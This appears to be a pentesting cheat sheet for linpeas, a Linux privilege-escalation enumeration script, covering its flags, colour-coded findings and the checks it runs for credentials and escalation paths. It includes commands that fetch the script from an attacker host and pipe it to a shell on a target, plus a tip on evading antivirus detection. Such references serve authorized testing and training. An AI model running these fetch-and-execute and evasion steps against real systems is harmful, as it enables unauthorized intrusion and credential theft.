# linpeas — Linux Privilege Escalation Awesome Script

> **One-script enum of a Linux target.** Finds SUIDs, writable paths, creds in files, kernel exploits, services, cron — colour-highlights winners.

**Get it:** `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh`

---

## 🎯 Cheat-flow

```bash
# On attacker host
python3 -m http.server 8000

# On target (any low-priv shell)
curl http://10.10.14.5:8000/linpeas.sh | sh
# or
wget http://10.10.14.5:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Save output + tee colours
./linpeas.sh -a | tee peas.out                  # all checks, including slow
./linpeas.sh -q                                  # quiet (fewer colours)
./linpeas.sh -s                                  # superfast
./linpeas.sh -P <password>                       # pass for sudo -l
```

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `-a` | All checks (slower; extra scans) |
| `-s` | Superfast (skips slow checks) |
| `-q` | Quiet / less colour |
| `-o <sections>` | Only run listed sections (e.g. `SysI,Devs`) |
| `-P <pass>` | Password for `sudo -l` / SSH checks |
| `-e` | Extra enum |
| `-d <CIDR>` | Discover hosts in subnet (network pivot) |
| `-p <port>` | Port scan targets |

---

## 🎨 Output colours — the **money highlights**

| Colour | Meaning |
|---|---|
| **Red + Yellow** | 95% **probable privesc** — look here first |
| **Red** | Might lead to privesc |
| **Yellow** | Useful info / worth checking |
| **Green** | Common / normal |
| **Light blue** | User info |

Search tip: `grep -E "PE:|95%"` the saved file.

---

## 📋 Key sections it runs

- **System info** — kernel, distro, env
- **Users** — sudo -l, PATH, groups, dangerous groups (`docker`, `lxd`, `disk`)
- **SUID / SGID / caps** — cross-check against GTFOBins
- **Cron** — writable cron files, `PATH` tricks
- **Writable files** in `$PATH`, `/etc`, systemd units
- **Kernel** — `CVE-*` exploit suggestions
- **Services** — running processes, MySQL as root
- **Network** — listening ports, nearby hosts
- **Creds** — history files, config files, `.git/config`, SSH keys, sudo tokens
- **Cloud metadata** — AWS/GCP/Azure IMDS check
- **Docker / LXC / k8s** breakout checks

---

## ⚠️ Gotchas

- Runs as current user — some checks show `No CAP_DAC_READ_SEARCH` / limited findings. Use `-P <pass>` if you know the password to let it run `sudo -l`.
- **AV may flag it** — most EDRs catch linpeas signature. Rename the script or run via `bash <(curl -sL URL)`.
- Full run is ~2–5 minutes on a normal box; longer on big filesystems.
- Don't just read red lines — yellow often hides hardcoded passwords.

---

## 🔗 Related

- [winpeas](winpeas.md) · [metasploit](metasploit.md) (post/multi/recon/local_exploit_suggester)
